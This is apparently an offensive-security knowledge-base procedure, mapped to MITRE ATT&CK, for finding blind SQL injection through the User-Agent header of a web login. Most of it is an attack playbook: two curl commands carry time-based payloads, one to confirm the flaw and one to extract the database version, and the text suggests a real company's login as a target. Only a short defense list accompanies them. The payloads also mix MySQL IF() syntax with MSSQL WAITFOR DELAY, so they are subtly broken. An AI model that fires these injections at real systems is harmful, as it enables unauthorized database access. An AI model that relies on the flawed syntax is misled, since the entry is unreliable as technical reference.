---
tags:
  - sqli
  - blind-sqli
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/inject-sqli-user-agent]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.464Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: cdf97146-245c-431b-8903-b0afa19a3869
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Discover Blind SQL Injection in User-Agent Header

## Summary

This procedure identifies a blind SQL injection vulnerability in the User-Agent HTTP header of a web login form, using time-based techniques to confirm arbitrary SQL execution on a Microsoft SQL Server backend without visible errors.

## Description

In the attack scenario, the login endpoint processes the User-Agent header unsafely in SQL queries, allowing injection. Target a public-facing web app like a Sony site's login. Prerequisites include HTTP access and tools for custom headers. Expected outcomes: confirmed injection via response delays, enabling data extraction or escalation.

## Requirements

1. Network access to the target login endpoint (e.g., HTTPS POST /login)
2. Ability to craft HTTP requests with custom User-Agent (curl or proxy)
3. Basic knowledge of MSSQL syntax for time-based payloads

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries, especially for headers like User-Agent
- Implement WAF rules to block SQL keywords in headers
- Monitor for unusual response time delays or anomalous HTTP headers

## Objectives

1. Confirm blind SQLi vulnerability
2. Establish basis for further exploitation
3. Extract initial database info via boolean/time conditions

## Instructions

### Step 1: Test Basic Injection

**Context**: Send a payload causing a time delay if SQL executes, targeting MSSQL's WAITFOR DELAY.

**Command** ([[commands/inject-sqli-user-agent]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: ' OR IF(1=1, WAITFOR DELAY '0:0:5', 0)--" -d "username=test&password=test" -w "%{time_total}\n"
```

> This injects a conditional delay; measure total time. Expect ~5s on success vs. normal response.

### Step 2: Confirm with Boolean Logic

**Context**: Use true/false conditions to extract data bits, e.g., database version.

**Command** ([[commands/inject-sqli-user-agent]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: ' OR IF(ASCII(SUBSTRING(@@VERSION,1,1))>64, WAITFOR DELAY '0:0:5', 0)--" -d "username=test&password=test" -w "%{time_total}\n"
```

> Delay indicates true (version char >64); iterate for full extraction.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/inject-sqli-user-agent]]

## Tools Used


## Tags

- [[sqli]]
- [[blind-sqli]]
